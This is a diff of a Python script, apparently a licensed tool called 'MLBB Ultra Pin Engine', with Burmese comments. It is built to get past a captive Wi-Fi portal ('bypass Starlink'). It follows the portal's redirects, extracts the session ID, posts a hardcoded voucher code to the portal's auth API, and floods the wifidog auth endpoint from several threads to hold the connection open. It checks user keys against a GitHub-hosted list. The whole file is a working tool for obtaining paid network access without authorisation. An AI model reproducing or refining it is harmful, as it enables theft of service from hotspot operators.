@@ -5,100 +5,105 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- [ SECTION 1: FIXED & ULTRA STABLE ID SYSTEM ] ---
 def get_hwid():
-    """ 
-    ဖုန်းရဲ့ Brand နဲ့ Model ကို အခြေခံပြီး ID ထုတ်ပေးမည်။
-    """
     try:
         brand = os.popen("getprop ro.product.brand").read().strip()
         model = os.popen("getprop ro.product.model").read().strip()
         stable_id = f"{brand}-{model}".upper()
-        
-        if not brand or brand == "":
-            node = uuid.getnode()
-            return str(uuid.UUID(int=node)).split('-')[-1].upper()
-            
+        if not brand:
+            return str(uuid.UUID(int=uuid.getnode())).split('-')[-1].upper()
         return stable_id
     except:
         return "V12-STABLE-USER"
 
-# --- [ SECTION 2: STARLINK ENGINE ] ---
+# --- [ SECTION 2: ULTRA PIN ENGINE ] ---
 def immortal_pulse(auth_link, session):
     while True:
         try:
-            session.get(auth_link, timeout=3, headers={"User-Agent": "Mozilla/5.0"}, verify=False)
-            socket.gethostbyname("1.1.1.1")
-            time.sleep(0.3) 
-        except: time.sleep(1)
+            session.get(auth_link, timeout=1.5, headers={"Connection": "keep-alive"}, verify=False)
+            socket.gethostbyname("8.8.8.8")
+            time.sleep(0.1)
+        except:
+            time.sleep(0.5)
 
 def start_starlink_engine():
+    """ အင်တာနက် ပွင့်အောင် အရင်လုပ်ပေးမည့် Engine """
     main_session = requests.Session()
+    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
+    main_session.mount('http://', adapter)
+    
     while True:
         try:
-            r = main_session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
+            # Connectivity Check လုပ်ပြီး Cod ကို ကျော်ရန် ကြိုးစားခြင်း
+            r = main_session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3)
             if r.status_code != 204:
                 p_url = r.url
-                r1 = main_session.get(p_url, timeout=5)
+                r1 = main_session.get(p_url, timeout=3)
                 match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
                 n_url = urljoin(p_url, match.group(1)) if match else p_url
-                r2 = main_session.get(n_url, timeout=5)
+                r2 = main_session.get(n_url, timeout=3)
                 sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
                 if sid:
                     p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
-                    main_session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid}, timeout=5)
+                    main_session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid}, timeout=3)
                     gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                     port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                     auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
-                    for _ in range(3):
+                    
+                    for _ in range(5):
                         threading.Thread(target=immortal_pulse, args=(auth_link, main_session), daemon=True).start()
-            time.sleep(10)
-        except: time.sleep(5)
+            time.sleep(5)
+        except:
+            time.sleep(2)
 
 # --- [ SECTION 3: MAIN UI & VERIFY ] ---
 def main():
     os.system('clear')
-    my_id = get_hwid() 
-    
+    my_id = get_hwid()
     print("\033[92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\033[96m   ⚔️  MLBB IMMORTAL ENGINE v12.0 (MASTER)  ⚔️")
-    print("\033[93m   STATUS: READY TO BYPASS STARLINK")
+    print("\033[96m   ⚔️  MLBB ULTRA PIN ENGINE v12.2 (MASTER)  ⚔️")
+    print("\033[93m   STATUS: AUTO UNLOCKING INTERNET...")
     print("\033[92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
-    print(f"\033[95m[ Your Device ID: {my_id} ]\033[0m\n")
     
-    user_key = input("\033[93m[?] Enter Your Key: \033[0m").strip()
-
-    print("\033[94m[*] Verifying Access...\033[0m")
+    # [ အရေးကြီး ] Key မစစ်ခင် အင်တာနက် အရင်ပွင့်အောင် Engine ကို Start လုပ်လိုက်သည်
     threading.Thread(target=start_starlink_engine, daemon=True).start()
-
-    # Cache မကျန်စေရန် Timestamp ပေါင်းထည့်ထားသော GitHub URL
-    url = f"https://raw.githubusercontent.com/kophyo-ops/mlbb-v12/main/keys.txt?t={int(time.time())}"
     
+    # အင်တာနက် လမ်းကြောင်းပွင့်ရန် ၃ စက္ကန့် စောင့်ခြင်း
+    print("\033[94m[*] Initializing Internet Path...\033[0m")
+    time.sleep(3)
+    
+    print(f"\033[95m[ Device ID: {my_id} ]\033[0m\n")
+    user_key = input("\033[93m[?] Key: \033[0m").strip()
+    
+    print("\033[94m[*] Verifying Access via GitHub...\033[0m")
+    
+    # GitHub မှ Key စစ်ဆေးခြင်း
+    url = f"https://raw.githubusercontent.com/kophyo-ops/mlbb-v12/main/keys.txt?t={int(time.time())}"
     try:
-        # Cache-Control Header ထည့်ပြီး အသစ်ဆုံးကို တိုက်ရိုက်ဆွဲယူခြင်း
-        r = requests.get(url, timeout=10, verify=False, headers={'Cache-Control': 'no-cache'})
-        if r.status_code == 200:
-            allowed_lines = r.text.splitlines()
-            authorized = False
-            for line in allowed_lines:
-                line = line.strip()
-                if ":" in line:
-                    saved_key, saved_id = line.split(":")
-                    if user_key == saved_key.strip() and my_id == saved_id.strip():
-                        authorized = True
-                        break
-            
-            if authorized:
-                print("\033[92m\n[✓] ACCESS GRANTED! BYPASS SUCCESS.\033[0m")
-                while True: time.sleep(100)
-            else:
-                print("\033[91m\n[!] Error: Invalid Key or Device not registered!\033[0m")
-                print(f"\033[90mDebug: ID {my_id} not found in keys.txt\033[0m")
-                os._exit(0)
-    except Exception as e:
-        print(f"\033[91m\n[!] Connection Error: {e}\033[0m")
+        # User တွေဆီမှာ လိုင်းမကောင်းရင် ၃ ကြိမ်အထိ ထပ်ခါတလဲလဲ ကြိုးစားခိုင်းသည်
+        for attempt in range(3):
+            try:
+                r = requests.get(url, timeout=10, verify=False, headers={'Cache-Control': 'no-cache'})
+                if r.status_code == 200:
+                    allowed_lines = r.text.splitlines()
+                    authorized = False
+                    for line in allowed_lines:
+                        if ":" in line.strip():
+                            saved_key, saved_id = line.strip().split(":")
+                            if user_key == saved_key.strip() and my_id == saved_id.strip():
+                                authorized = True; break
+                    
+                    if authorized:
+                        print("\033[92m\n[✓] ACCESS GRANTED! PIN OPTIMIZED.\033[0m")
+                        while True: time.sleep(100)
+                    else:
+                        print(f"\033[91m\n[!] ID {my_id} not registered!\033[0m"); os._exit(0)
+                break 
+            except:
+                if attempt == 2: raise
+                time.sleep(2)
+    except:
+        print("\033[91m\n[!] Connection Error! Please restart the tool.\033[0m")
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        os._exit(0)
-
+    try: main()
+    except KeyboardInterrupt: os._exit(0)
